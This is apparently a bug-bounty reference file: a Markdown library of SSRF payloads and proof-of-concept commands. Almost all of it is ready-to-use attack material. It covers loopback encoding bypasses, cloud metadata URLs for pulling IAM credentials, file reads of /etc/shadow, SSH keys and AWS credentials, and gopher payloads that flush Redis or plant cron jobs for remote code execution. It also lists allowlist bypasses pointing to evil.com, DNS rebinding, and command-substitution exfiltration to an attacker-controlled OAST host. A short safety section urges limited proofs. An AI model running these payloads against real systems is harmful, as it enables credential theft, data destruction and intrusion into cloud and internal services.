# SSRF Payload Library

> Companion to `references/ssrf-killchain.md`. Test in order: localhost reachability -> cloud metadata -> internal services -> bypasses.

---

## 1. LOCALHOST / LOOPBACK

```
http://127.0.0.1
http://127.0.0.1:80
http://localhost
http://localhost.
http://0
http://0.0.0.0
http://[::]
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://[::ffff:7f00:1]
http://2130706433        # 127.0.0.1 in decimal
http://0x7f000001        # 127.0.0.1 in hex
http://0177.0.0.1        # octal first byte
http://127.000.000.001
http://127.1
http://127.0.1
http://①②⑦.0.0.1          # full-width Unicode digits
http://localhost\@evil.com
```

---

## 2. CLOUD METADATA

### AWS IMDSv1
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### AWS IMDSv2 (need PUT first)
```
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
-> token

GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token>
```

### GCP
```
http://169.254.169.254/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/
```
Header required: `Metadata-Flavor: Google`

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```
Header required: `Metadata: true`

### Alibaba
```
http://100.100.100.200/latest/meta-data/
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/user-data
```

### Oracle
```
http://192.0.0.192/latest/
```

### Kubernetes pod
```
http://169.254.169.254/latest/dynamic/instance-identity/document   # AWS EKS
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
```

---

## 3. INTERNAL SERVICES

```
http://127.0.0.1:6379       # Redis
http://127.0.0.1:8500       # Consul
http://127.0.0.1:8200       # Vault
http://127.0.0.1:9200       # Elasticsearch
http://127.0.0.1:5984       # CouchDB
http://127.0.0.1:11211      # Memcached
http://127.0.0.1:8080       # Internal admin / Jenkins / Spring Actuator
http://127.0.0.1:15672      # RabbitMQ
http://127.0.0.1:2375       # Docker daemon (no TLS!)
http://127.0.0.1:9000       # SonarQube / MinIO
http://127.0.0.1:8086       # InfluxDB
http://127.0.0.1:27017      # Mongo
http://127.0.0.1:5432       # Postgres
http://127.0.0.1:3306       # MySQL
http://127.0.0.1:1433       # MSSQL
http://127.0.0.1:5601       # Kibana
http://127.0.0.1:8888       # Jupyter
http://127.0.0.1:3000       # Grafana / Node
http://127.0.0.1:9090       # Prometheus
http://kubernetes:443       # K8s API
http://metadata             # GCP shorthand
```

---

## 4. FILE READ via SSRF parser

```
file:///etc/passwd
file:///etc/hostname
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/cwd/config.yml
file:///proc/self/cwd/.env
file:///root/.aws/credentials
file:///root/.ssh/id_rsa
file:///root/.docker/config.json
file:///var/log/syslog
file:///var/log/auth.log
file:///etc/shadow
file://localhost/etc/passwd
```

PHP wrappers (when target is PHP):
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=/etc/passwd
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
expect://id
phar://upload/evil.phar.jpg
```

---

## 5. PROTOCOL VARIETY

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a   # Redis
gopher://127.0.0.1:25/_HELO%20a%0aMAIL%20FROM:...          # SMTP
gopher://127.0.0.1:11211/_set%20a%200%200%201%0d%0a1       # Memcache
dict://127.0.0.1:6379/info
ftp://127.0.0.1/
sftp://127.0.0.1/
ldap://127.0.0.1/
tftp://127.0.0.1/
```

Use `gopherus` to generate full payloads:
```bash
gopherus --exploit redis
gopherus --exploit mysql
gopherus --exploit smtp
gopherus --exploit fastcgi
```

---

## 6. URL PARSER BYPASSES (for allowlist filters)

```
http://allowed.com#@127.0.0.1/
http://allowed.com:80@127.0.0.1/
http://127.0.0.1.allowed.com/
http://allowed.com.evil.com/
http://allowed.com@evil.com/
http://allowed.com\@evil.com/
http://allowed.com%23@evil.com/
http://allowed.com%2F@evil.com/
http://allowed.com%2e/        # trailing dot encoded
http://allowed.com.            # trailing dot raw

# Python urllib vs requests parsing differ - try both
http://[::1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://[::1%25]/        # zone-id

# Backend behind LB - host header trick
GET / HTTP/1.1
Host: 127.0.0.1
X-Forwarded-Host: allowed.com
```

---

## 7. DNS REBINDING

Set up at `1u.ms`:
```
http://make-127-0-0-1-rr-evil-com.1u.ms/
http://make-169-254-169-254-rr-evil-com.1u.ms/
```

`make-A-B-C-D-rr-X.1u.ms` returns A.B.C.D first, then your evil domain (subsequent queries).

Tools:
- `singularity` (NCC Group)
- `dns-rebinding` (Tavis Ormandy)

---

## 8. BLIND SSRF EXFIL

When response not returned, exfil via DNS:
```
http://$DATA_BASE32.your.oast.fun/
http://`id`.your.oast.fun/
http://`whoami`-test.your.oast.fun/
```

Or via timing:
```
http://127.0.0.1:81/  -> connection-refused timing
http://127.0.0.1:22/  -> open + slow vs closed + fast
```

---

## 9. PROOF-OF-CONCEPT TEMPLATES

### AWS metadata + STS confirm
```bash
# 1. SSRF -> get role name
curl 'https://target/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# 2. Get creds
curl 'https://target/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'
# 3. Set creds locally
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
# 4. Confirm scope (don't pivot)
aws sts get-caller-identity
```

### gopher Redis cron RCE (don't run on prod without permission)
```bash
gopherus --exploit redis
# Choose cron, paste your callback
# Insert into target's url= param, URL-encode the gopher payload twice
```

---

## 10. SAFETY NOTES

- For BBP work: prove SSRF with one benign hit (read role name or `/latest/`), don't enumerate creds beyond what's needed
- IMDSv2 PUT-then-GET is harder via simple SSRF (most allow only GET); reduce to GET-only metadata calls or note it as "IMDSv1 only" finding
- For internal services, port scan via timing carefully; don't spam
- Capture: full request/response, screenshot of OAST hit
